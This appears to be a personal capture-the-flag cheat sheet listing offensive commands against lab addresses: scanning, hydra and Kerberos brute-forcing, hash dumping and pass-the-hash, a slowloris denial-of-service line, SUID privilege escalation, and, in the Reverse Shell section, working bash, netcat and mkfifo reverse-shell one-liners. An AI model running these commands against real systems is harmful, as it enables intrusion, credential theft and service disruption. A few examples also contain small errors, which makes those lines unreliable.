# CTF Kunai
---------------------------------------------------------------------------
#### This is help me while doing CTF. 

---------------------------------------------------------------------------
## Table Of Contents
* [Web Exploitation](#web-exploitation)
  * [Enumeration](#enumeration)
    * [Dirsearch](#dirsearch)
    * [Enum4linux](#enum4linux)
    * [Gobuster](#gobuster)
    * [Nmap](#nmap)
    * [Nikto](#nikto)
    * [Rustscan](#rustscan)
  * [Exploitation](#exploitation)
    * [Hydra](#hydra)
    * [Evil-winrm](#evil-winrm)
    * [Impacket](#impacket)
    * [Kerberos](#kerberos)
    * [Kerbrute](#kerbrute)
    * [Knock](#knock)
    * [Netcat](#netcat)
    * [Ffuf](#ffuf)
    * [Peass-ng](#peass-ng)
    * [PrintSpoofer](#printspoofer)
    * [Smbclient](#smbclient)
    * [Sqlmap](#sqlmap)
    * [Socat](#socat) 
    * [Viper Monkey](#viper-monkey)
  * [Priviledge Escalation](#priviledge-escalation)
    * [Enumerating the target](#Enumerating-the-target)
    * [Reverse Shell](#reverse-shell)
* [Cryptography](#Cryptography)
  * [Fcrackzip](#fcrackzip)
  * [John The Ripper](#john-the-ripper)
  * [Hashcat](#hashcat)
  * [GPG file](#gpg)
  * [Openssl](#openssl)


* [Command](#Command)
  * [Find](#find)
  * [FTP](#ftp)
  * [Mysql](#mysql)
  * [RDP](#rdp)
  * [SCP](#scp)
  * [SSH](#ssh)
* [Forensics](#forensics)
  * [Binwalk](#binwalk)
  * [Steghide](#Steghide)
  * [Stegsolve](#Stegsolve)  
  * [Zsteg](#zsteg)
* [Reverse Engineering](#reverse-engineering)
  * [GDB](#gdb)
* [Template](#template)
  * [Template Software](#template-software)
  * [Template Command](#template-command)
  * [Template Link](#)

---------------------------------------------------------------------------

# Web Exploitation

- # Enumeration
### Dirsearch
- ###  Brute Force URL
dirsearh -u http://google.com
###### Example :
```
dirsearch -u http://hackme.my.id/
```
- ###  Brute Force Existing URL
dirsearh -u http://google.com -x 403
###### Example :
```
dirsearch -u http://hackme.my.id/ -x 403
```
- ###  Brute Force URL with Extensions
dirsearh -u http://google.com -e php,html,js,txt
###### Example :
```
dirsearch -u http://hackme.my.id/ -e php,html,js,txt
```
---------------------------------------------------------------------------
## Gobuster
### 𝚰. Gobuster Dir
- ### Find Website Directory 
gobuster dir -u [website url] -w [path to wordlist]  
###### Example :
```
gobuster dir -u https://10.10.10.11 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt  
```
- ### Find Website Directory with Spesific Extension 
gobuster dir -u [website url] -w [path to wordlist] -x .php, .txt
###### Example :
```
gobuster dir -u http://10.10.10.11/ -w /usr/share/wordlists/Discovery/Web-Content/common.txt -x .php, .txt 
```
### 𝚰𝚰. Gobuster Vhost
- ### Find Subdomain Directory 
gobuster vhost -v -u [website url] -w [path to wordlist]  
###### Example :
```
gobuster vhost -v -u https://10.10.10.11 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  
```

### 𝚰𝚰𝚰. Gobuster DNS
- ### Find Subdomain In A Spesific Domain 
gobuster dns -d [domain] -w [path to wordlist] -i
###### Example :
```
gobuster dns test.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -i 
```
---------------------------------------------------------------------------
## Enum4linux
- ###  Enumerate Windows and SMB Shares
enum4linux [IP Target]
###### Example :
```
enum4linux 10.10.10.11
```

---------------------------------------------------------------------------

## Nmap
### 𝚰. Enumeration And Information Gathering

- ### All Port Scanning
nmap -p- [IP Target]
###### Example :
```
nmap -p- 10.10.10.11
```

- ### Service Scanning
nmap -sV [IP Target]
###### Example :
```
nmap -sV 10.10.10.11
```

- ### Faster OS and Service Scanning
nmap -A -T4 -n [IP Target]
###### Example :
```
nmap -A -T4 10.10.10.11
```

- ### TCP protocols scanning
nmap -sT [IP Target]
###### Example :
```
nmap -sT 10.10.10.11
```

- ### UDP protocols scanning
nmap -sU [IP Target]
###### Example :
```
nmap -sU 10.10.10.11
```

- ### CVE Scanning
nmap -Pn --script vuln [IP Target]
###### Example :
```
nmap -Pn --script vuln 10.10.10.11
```

- ### Aggressively all port Scanning
nmap -sC -sV -p- -T4 --min-rate=9326 -vv [IP Target]
###### Example :
```
nmap -n -sC -sV -p- -T4 --min-rate=9326 -vv -n 10.10.10.11
```

- ### Malware Infection Scanning
nmap -sV --script=http-malware-host [IP Target]
###### Example :
```
nmap -sV --script=http-malware-host 10.10.10.11
```

- ### Vulnerability Scanning
nmap --script vuln -p [Port] [IP Target] 
###### Example :
```
nmap --script vuln -p 22,80 10.10.10.11
```


### 𝚰𝚰. Penetration Testing
- ### DOS 
nmap [IP Target] -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
###### Example :
```
nmap 10.10.10.1 -max-parallelism 800 -Pn --script http-slowloris,dos --script-args http-slowloris.runforever=true
```

- ### Wordpress Bruteforce
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' [IP Target]
###### Example :
```
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 10.10.10.11
```

- ### Ftp Bruteforce
nmap --script ftp-brute -p  --script-args userdb=users.txt,passdb=passwords.txt 21 [IP Target]
###### Example :
```
nmap --script ftp-brute -p 21 --script-args userdb=[username-wordlist.txt],passdb=[passwords-wordlist.txt] 10.10.10.1
```

- ### NFS Bruteforce
nmap -sV --script=nfs-ls,nfs-statfs,nfs-showmount [IP Target]
###### Example :
```
nmap -sV --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.99.121
```

---------------------------------------------------------------------------
## Nikto
- ###  Nikto Vulnerability Scan
###### Example :
```
nikto -h http://10.10.222.32/
```
- ###  Nikto Vulnerability Scan with Credentials
###### Example :
```
nikto -id bob:bubbles -h http://10.10.222.32:1234/manager/html
```


---------------------------------------------------------------------------
## Rustscan
- ###  Port And Service Scanning
rustscan [IP Target] --ulimit 5000
###### Example :
```
rustscan 10.10.10.11 --ulimit 5000 
```
---------------------------------------------------------------------------
- # Exploitaion
## Hydra
- ### FTP Bruteforce
hydra -l user -P [path to pass-wordlist] ftp://[IP Target]
###### Example :
```
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.11
```
- ### SSH Bruteforce
hydra -l [username] -P [path to pass-wordlist] [IP Target] -t 4 ssh
###### Example :
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 -t 4 ssh 
```
SSH Specific Port Bruteforce
hydra -s 4567 -l [username] -P [path to pass-wordlist] [IP Target] -t 4 ssh
###### Example :
```
hydra -s 4567 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 -t 4 ssh 
```

- ### SMB Bruteforce
hydra -t 1 -V -f -l administrator -P [path to pass-wordlist] 10.10.10.11 smb
###### Example :
```
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.11 smb
```

- ### Post Web Form
hydra -l [username] -P [path to pass-wordlist] [IP Target] http-post-form "/[login webpage]:username=^USER^&password=^PASS^:F=[Failed login message]" -V 
###### Example :
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.11 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V
```
- ###  Http-get Web Brute Force
hydra -l admin -P [path to pass-wordlist] [IP Target] http-get -t 64
###### Example :
```
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.244.40 http-get -t 64 
```
- ### Hydra User Enumerate
hydra -L [path to user-wordlist] -p test [IP Target] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username." -V
###### Example :
```
hydra -L fsociety.dic -p test 10.10.10.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid Username." -V
```
- ### Brute Force The User Password 
hydra -l [Valid User] -P [path to pass-wordlist] [IP Target] http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:[Failed Login Message]" -V
###### Example :
```
hydra -l Elliot -P fsocity.dic 10.10.10.11 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -V
```

---------------------------------------------------------------------------
## Kerbrute
- ### Enumerating Valid User
./kerbrute_linux_amd64 userenum -dc [target domain controller] -d [domain] [path to user-wordlist]
###### Example :
```
./kerbrute_linux_amd64 userenum --dc 10.10.10.11 -d spookysec.local /usr/share/wordlists/userlist.txt
```
---------------------------------------------------------------------------
## Knock
- ### Port Knock Client
knock [IP Target] [Port / Special Code for Make sure you are the client]
###### Example :
```
knock 10.10.114.147 1111 2222 3333 4444
```

---------------------------------------------------------------------------
## Impacket
After get the valid user now let's get the query ticket from the user using Impacket tools (GetNPUsers)
- ### Query Ticket with GetNPUsers.py
./GetNPUsers.py -no-pass -dc-ip [target domain controller] [domain]/[valid user]
###### Example :
```
./GetNPUsers.py -no-pass -dc-ip 10.10.10.11 spookysec.local/svc-admin
```

- ### NTLM Hash with secretsdump
secretsdump.py -dc-ip [IP Target] [domain]/[user from credential]:[pass from credential]@[IP Target]
###### Example :
```
secretsdump.py -dc-ip 10.10.154.40 spookysec.local/backup:backup2517860@10.10.154.40
```
---------------------------------------------------------------------------

## Netcat
- ###  Netcat Listener
nc -lvnp <port-number>
###### Example :
```
nc -lvnp 4444
```
- ###  Bind Shells
nc <target-ip> <chosen-port>
###### Example :
```
nc 10.10.10.11 4444
```
- ###  Netcat Stabilisation
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
press ctrl+z to background the shell
```
stty raw -echo; fg
```
- ### Netcat Transfer File
### 𝚰. From the Local Machine
- ### First listen to the file in the specific port
nc -l -p [Port] > [File to Transfer]  
###### Example :
```
nc -l -p 1234 > important.txt  
```
### 𝚰𝚰. From the Remote Machine
- ### Now let's transfer the file to the local machine 
nc -w 3 [IP Local] [Port] < [File to Transfer]  
###### Example :
```
nc -w 3 10.10.10.11 1234 < important.txt  
```
---------------------------------------------------------------------------
## Smbclient 
- ### Smbclient IP Listing
smbclient -L [IP Target] 
###### Example :
```
smbclient -L 10.10.10.11
```
- ### Smbclient Domain Listing
smbclient -L [IP Target] -U '[domain]'
###### Example :
```
smbclient -L 10.10.10.11 -U 'svc-admin'
```
- ### Smbclient Login
smbclient //[IP Target]/backup -U '[domain]'
###### Example :
```
smbclient //10.10.10.11/backup -U 'svc-admin'
```
---------------------------------------------------------------------------
## Sqlmap 
- ### Sqlmap Database Check
sqlmap -r [file request] --dbs --batch
###### Example :
```
sqlmap -r req --dbs --batch
```
- ### Sqlmap Table Check
sqlmap -r [file request] --dbs --batch -D [databases] --tables
###### Example :
```
sqlmap -r req --dbs --batch -D THM_f0und_m3 --tables
```
```
sqlmap -r req -D social --tables
```
- ### Sqlmap Column Check
sqlmap -r [file request] --dbs --batch -D [databases] -T [tables] --columns
###### Example :
```
sqlmap -r req --dbs --batch -D THM_f0und_m3 -T user --columns
```
- ### Sqlmap Current Database
sqlmap -r [file request] --current-db
###### Example :
```
sqlmap -r req --current-db
```
- ### Sqlmap Query Select
sqlmap -r [file request] --dbs --batch -D [databases] -T [tables] -C [columns] --sql-query "select [columns] from [tables]"
###### Example :
```
sqlmap -r req --dbs --batch -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
```
- ### Sqlmap Dump Columns
sqlmap -r [file request] --dbs --batch -D [databases] -T [tables] -C [columns] --sql-query "select [columns] from [tables]"
###### Example :
```
sqlmap -r req -D social -T users -C username,email,password --dump
```
---------------------------------------------------------------------------
## Socat
- ###  Fork SSH in the specific port from Target Machine
First Install [Socat Binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat), After that run the binary.
./socat tcp-listen:[Port Number],reuseaddr,fork tcp:localhost:22
###### Example :
```
./socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22 
```
---------------------------------------------------------------------------
## Evil-winrm
- ### Login With Hash key 
evil-winrm -i [IP Target] -u [User] -H [NTLM Hash]
###### Example :
```
evil-winrm -i 10.10.154.40 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
---------------------------------------------------------------------------
## Kerberos
### 𝚰. Rubeus
- ### Harvest Ticket
The ticket is used in other attacks such as the pass the ticket attack.
###### Example :
```
Rubeus.exe harvest /interval:30
```
- ### Brute-Forcing and Password-Spraying
First, add your target IP and target Domain in your machine hosts file
#### ❒ Windows :
echo 10.10.10.11 targetdomain.com >> C:\Windows\System32\drivers\etc\hosts
###### Example :
```
echo 10.10.41.179 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```
#### ❒ Linux :
echo 10.10.10.11 targetdomain.com >> /etc/hosts
###### Example :
```
echo 10.10.41.179 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

#### ❒ After that you can brute/password spray the target.
The ticket is used in other attacks such as the pass the ticket attack.
###### Example :
```
Rubeus.exe brute /password:Password1 /noticket
```
---------------------------------------------------------------------------
## Viper Monkey
- ### Display IOCs VBA 
pypy [path to vmonkey.py] --iocs [path to file]
###### Example :
```
pypy ./ViperMonkey-master/vipermonkey/vmonkey.py --iocs /home/kali/Downloads/invoice.vb
```
---------------------------------------------------------------------------

  
## Ffuf
- ###  Fuzzing URL Directory
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://google.com/FUZZ
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://trick.htb/FUZZ 
```

- ###  Fuzzing Subdomain Directory
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://google.com/ -H 'Host: FUZZ.google.com' -v -fs 5480 
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://trick.thb/ -H 'Host: FUZZ.trick.htb' -v -fs 5480 
```

- ###  Fuzzing LFI Directory
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://google.com/index.php?page=FUZZ -v -fs 0
###### Example :
```
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -v -fs 0 
```

- ###  Fuzzing Username Directory
```
ffuf -w /usr/share/wordlists/dirb/big.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.169/customers/signup -mr "username already exists" 
```

- ###  Fuzzing Password Directory
```
ffuf -w ./your_valid_usernames.txt:W1,./your-wordlists:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.62.169/customers/login -fc 200 
```

- ###  Fuzzing Extension File
```
ffuf -u http://10.10.124.201/indexFUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt 
```
---------------------------------------------------------------------------

## PrintSpoofer
- ###  Windows Priviledge Escalation
Software .exe -> https://github.com/dievus/printspoofer
###### Example :
```
PrintSpoofer.exe -i -c cmd 
```
---------------------------------------------------------------------------
## Peass-ng
- [Link Repo PEASS](https://github.com/carlospolop/PEASS-ng)
- [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
### 𝚰. Linpeas
- ### Linpeas with curl 
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh  
```
- ### Linpeas run from Attacking Machine to Target Machine
First Install Linpeas.sh File in [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
After that, open port in Attacking Machine so the Target Machine can Download an Run This file.
```
python3 -m http.server 9999   
```
Install File from Attacking Machine to the Target Machine
###### Example :
wget http://[IP Local]:9999/linpeas.sh   
```
wget http://10.10.10.11:9999/linpeas.sh   
```
From The Target Machine give file execute permission and run the file
```
chmod +x linpeas.sh   
```
```
./linpeas.sh   
```
### 𝚰𝚰. Winpeas
- ### Winpeasx64 Run Locally Powershell
First install Winpeasx64.exe [Install PEASS](https://github.com/carlospolop/PEASS-ng/releases/)
After that, open port in Attacking Machine so the Target Machine can Download an Run This file.
```
python3 -m http.server 9999   
```
Install File from Attacking Machine to the Target Machine
###### Example :
IWR http://[IP Local]:9999/winPEASx64.exe -OutFile winPEASx64.exe
```
IWR http://10.10.10.11:9999/winPEASx64.exe -OutFile winPEASx64.exe
```
Run the file
```
.\winPEASx64.exe
```
------------------------------------------------------------------------------------------------------------------------------------------------------

# Priviledge Escalation
## Enumerating The Target
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Reverse Shell
- ### Listing priviledge file 
###### Example :
```
sudo -l 
```


- ### Bash
### 𝚰. Bash TCP
###### Example :
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  
```
### 𝚰𝚰. Bash exec
 
###### Example :
```
bash -c 'exec bash -i &>/dev/tcp/10.18.80.154/9999 <&1'  
```
 
- ### Finding suid file  
###### Example :
```
find / -perm -u=s -type f 2>/dev/null
```

- ### Netcat
### 𝚰. Netcat /bin/sh 
###### Example :
```
nc -e /bin/sh 10.0.0.1 1234  
```
### 𝚰𝚰. Netcat /tmp/f
 
###### Example :
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.80.154 9999 >/tmp/f  
```



------------------------------------------------------------------------------------------------------------------------------------------------------

# Cryptography

## Fcrackzip
- ###  fcrackzip -b -D -p [wordlist] -v [file name]
```
fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt -v christmaslists.zip
```
- ### Crack Zip password number only
###### Example :
```
fcrackzip -b -v -c '1' -l 1-10 37366.zip -u
```
- ### Cracking password use unzip
###### Example :
```
fcrackzip -v -u -D -p rockyou.txt 6969.zip
```


---------------------------------------------------------------------------
## John The Ripper

- ### Show Format Syntax
john [options] [path to file]
###### Example :
```
john --show=formats hash.txt
```

- ### Automatic Cracking with wordlist
john --wordlist=[path to wordlist] [path to file]
###### Example :
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- ### Format-Specific Cracking
john --format=[format] --wordlist=[path to wordlist] [path to file]
###### Example :
```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- ### Unshadow file
unshadow [path to passwd] [path to shadow] > [file to fill unshadow]
###### Example :
```
unshadow local_passwd local_shadow > unshadowed.txt
```
#### ❒After get the unshadow file now crack the hash
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

- ### Single Crack Mode
john --single --format=[format] [path to file]
###### Example :
```
john --single --format=raw-md5 hash7.txt
```
###### notes : hash7.txt -> “ username:[hash_script] “

- ### Crack Zip File Password
zip2john [options] [zip file] > [output file]
###### Example :
```
zip2john secure.zip > secure.txt
```
#### ❒ After get the secure.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt secure.txt
```

- ### Crack Rar File Password
rar2john [rar file] > [output file]
###### Example :
```
rar2john secure.rar > secure-rar.txt
```
#### ❒ After get the secure-rar.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt secure-rar.txt
```

- ### Crack SSH Key Password
ssh2john [id_rsa private key file] > [output file]]
###### Example :
```
ssh2john id_rsa.rsa > id_rsa.txt
```
#### ❒ After get the id_rsa.txt now crack the file
```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt
```


## Hashcat
[Hash Type Documentation](https://hashcat.net/wiki/doku.php?id=example_hashes)
- ### Identify the hash using hash-identifier
```
hash-identifier 
```
- ### Identify the hash using hashid
hashid -m [file contains query]
###### Example :
```
hashid -m hash.txt
```
- ### Hashing the hash with hash type
hashcat -m [hash type] [file contains query] [path to user-wordlist]
###### Example :
```
hashcat -m 18200 hash.txt /usr/share/wordlists/passwordlist.txt 
```
- ### Hashing the hash with hash type
hashcat -m [hash type] [file contains query] [path to user-wordlist]
###### Example :
```
hashcat -m 18200 hash.txt /usr/share/wordlists/passwordlist.txt 
```
- ### Force hashing with hash type
hashcat -m [hash type] -a 0 [file contains query] [path to user-wordlist] --force
###### Example :
```
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/passwordlist.txt --force
```

---------------------------------------------------------------------------

## GPG
- ###  Decrypt File .gpg
###### Example :
```
gpg --decrypt note1.txt.gpg 
```
---------------------------------------------------------------------------
## Openssl
- ###  Decrypt File with private.key
###### Example :
```
openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2.txt 
```


------------------------------------------------------------------------------------------------------------------------------------------------------

# Command


## Cryptography
- ###  Base64 Encode
```
echo "Hello World" | base64
```
- ###  Base64 Decode
```
echo "SGVsbG8gV29ybGQK" | base64 -d
```

---------------------------------------------------------------------------

## Find
- ###  Find file by name
```
find / -type f -name *flag*.txt 2>/dev/null
```
```
find / -type f -name *user*.txt 2>/dev/null
```
```
find / -type f -name *root*.txt 2>/dev/null
```
- ### Find file by Spesific date modified
```
find / -type f -newermt '6/30/2020 0:00:00'
```
- ###  Find file by start and end date modified.  
```
find /home/topson/workflows -type f -newermt 2016-09-11 ! -newermt 2016-09-14 2> /dev/null
```

- ###  Find directory by name
```
find / -type d -name *flagdirectory* 2>/dev/null
```

- ### Finding SUID file  
###### Example :
```
find / -perm -u=s -type f 2>/dev/null
```
 - ### Finding PrivEsc File
###### Example :
```
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
 - ### Finding PrivEsc   
###### Example :
```
find . -exec chmod 777 /root \;
```
 - ### Running Linux Command with Find   
###### Example :
```
find /home/admin/important.txt -exec cat {} \;
```
 - ### Running Bash File with Find   
###### Example :
```
find . -exec /bin/bash -p \; -quit
```
  - ### Ignore Case Sensitive with Find   
###### Example :
```
find / 2>>/dev/null | grep -i "flag"
```
---------------------------------------------------------------------------

## Grep
- ###  Grep strings from file
```
grep -i "flag" root.txt
```
- ###  Grep strings to know the file name
```
grep -iRl "flag" root.txt
```
---------------------------------------------------------------------------
## Format Strings
- ###  Input to Hex
```
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
```
---------------------------------------------------------------------------
## FTP
- ###  How To FTP
```
ftp 10.10.10.11
```
---------------------------------------------------------------------------
## Mysql
- ### How To run SQL Database
```
mysql -u root -h 10.10.10.11 -p
```
- ### Database Listing
```
show databases;
```
- ### Use Database
```
use data;
```
- ### Table Listing from database
```
show tables;
```
- ### Read anything from Table
```
select * from USERS;
```
---------------------------------------------------------------------------
## RDP
- ###  How To RDP
```
rdesktop Administrator@MyDomain 10.10.10.11
```
---------------------------------------------------------------------------
## SCP
- ### Copy from local to remote
```
scp Documents/shell.php root@10.10.10.11:/home/vulnuser
```
- ### Copy from remote to local
```
scp 10.10.10.11:/home/important.txt home/Documents
```
---------------------------------------------------------------------------
## SSH
- ###  How To SSH
```
ssh root@10.10.10.11
```
- ###  SSH with Public Key
```
ssh -i id_rsa root@10.10.10.11
```
---------------------------------------------------------------------------

# Forensics
## Binwalk 
- ### Hidden File Analysis
```
binwalk -e image.jpg
```
## Steghide
- ### Info about hidden file
steghide info [file]
```
steghide info TryHackMe.jpg
```
- ### Extract hidden file
steghide extract -sf [file]
```
steghide extract -sf TryHackMe.jpg
```
## Stegsolve 
First Install the [stegsolve.jar](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) file
- ### Run the .jar file
```
java -jar stegsolve.jar
```
## Zsteg
Stegano .PNG file 
- ### Analysis PNG file
```
zsteg image.png
```
---------------------------------------------------------------------------
# Reverse Engineering
I personally use GDB all in one. [source](https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8)
## GDB 

- ### Start reversing the file using gdb 
```
gdb-peda crackme
```
```
gdb-gef crackme
```
```
gdb-pwndbf crackme
```
- ### Print information about the functions 
```
info functions
```
- ### Set the breakpoint 
```
b *0x0000000000400520
```
- ### Run the file 
```
run test
```
- ### Start the file 
```
start test
```
- ### Print information about the registers 
```
info registers
```
- ### Print value as a strings 
```
x/s 0x7fffffffde10
```
```
x/s $rbp
```
- ### Print value as a decimal/integer
```
x/d 0x7fffffffde10
```
- ### Run the file with arguments
```
gdb-peda --args crackme flag
```


---------------------------------------------------------------------------
# Template
## Template Software
- ###  oooooooo
ooooooooooooooooooooooooooooooooooo
###### Example :
```
ooooooooooooooooooooooooooooooooooo 
```

---------------------------------------------------------------------------
## Template with Sub Contents
### 𝚰. oooooooo
- ### ooooooooooooooooooooooooooooooooooo 
ooooooooooooooooooooooooooooooooooo  
###### Example :
```
ooooooooooooooooooooooooooooooooooo  
```
### 𝚰𝚰. oooooooo
- ### ooooooooooooooooooooooooooooooooooo 
ooooooooooooooooooooooooooooooooooo  
###### Example :
```
ooooooooooooooooooooooooooooooooooo  
```

---------------------------------------------------------------------------
## Template Command
- ###  oooooooo
```
ooooooooooooooooooooooooooooooooooo
```

---------------------------------------------------------------------------

